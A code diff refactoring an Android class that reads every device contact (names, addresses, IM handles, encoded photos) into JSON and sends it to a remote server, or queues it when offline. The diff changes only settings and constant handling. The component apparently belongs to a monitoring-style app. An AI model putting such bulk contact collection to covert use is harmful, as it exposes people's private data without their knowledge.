@@ -10,21 +10,21 @@ import org.json.JSONObject;
 import android.content.ContentResolver;
 import android.content.ContentUris;
 import android.content.Context;
-import android.content.SharedPreferences;
 import android.database.Cursor;
 import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
 import android.net.Uri;
 import android.os.AsyncTask;
-import android.preference.PreferenceManager;
 import android.provider.ContactsContract;
 import android.provider.ContactsContract.CommonDataKinds.Im;
 import android.provider.ContactsContract.CommonDataKinds.StructuredPostal;
 import android.util.Base64;
 
-import com.inet.android.request.ConstantRequest;
+import com.inet.android.bs.NetworkChangeReceiver;
+import com.inet.android.request.ConstantValue;
 import com.inet.android.request.RequestList;
 import com.inet.android.utils.Logging;
+import com.inet.android.utils.ValueWork;
 
 /**
  * ListContact class is designed to get the list of contact
@@ -40,7 +40,7 @@ public class ListContacts extends AsyncTask<Context, Void, Void> {
 
 	private String LOG_TAG = ListContacts.class.getSimpleName().toString();
 	private String complete;
-	private String version;
+	private int version;
 	private int imType;
 	private int type;
 
@@ -51,18 +51,17 @@ public class ListContacts extends AsyncTask<Context, Void, Void> {
 		JSONObject jsonPhoneType;
 		JSONObject jsonContact;
 		ContentResolver cr = mContext.getContentResolver();
-		SharedPreferences sp = PreferenceManager
-				.getDefaultSharedPreferences(mContext);
-		version = sp.getString("list_contact", "0");
-
+		
+		version = ValueWork.getMethod(ConstantValue.TYPE_LIST_CONTACTS, mContext);
+		
 		String encodedImage = null;
 		StringBuilder sAdress;
 
 		Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null,
 				null, null, null);
 
-		if (sp.getBoolean("network_available", true) == true) {
-			if (cur.getCount() > 0) {
+		if (NetworkChangeReceiver.isOnline(mContext)) {
+				if (cur.getCount() > 0) {
 				while (cur.moveToNext()) {
 					complete = "0";
 					jsonContact = new JSONObject();
@@ -328,7 +327,7 @@ public class ListContacts extends AsyncTask<Context, Void, Void> {
 
 		} else {
 			Logging.doLog(LOG_TAG, "else connect", "else connect");
-			TurnSendList.setList(ConstantRequest.TYPE_LIST_CONTACTS_REQUEST, version, "0", mContext);
+			TurnSendList.setList(ConstantValue.TYPE_LIST_CONTACTS, version, "0", mContext);
 		}
 	}
 
@@ -340,7 +339,7 @@ public class ListContacts extends AsyncTask<Context, Void, Void> {
 	private void sendRequest(String str, String complete) {
 		Logging.doLog(LOG_TAG, "sendRequest: complete " + complete,
 				"sendRequest: complete " + complete);
-		RequestList.sendDemandRequest(str, ConstantRequest.TYPE_LIST_CONTACTS_REQUEST, complete, version, mContext);
+		RequestList.sendDemandRequest(str, ConstantValue.TYPE_LIST_CONTACTS_REQUEST, complete, version, mContext);
 	}
 
 	private String getTipe(int phonetype) {
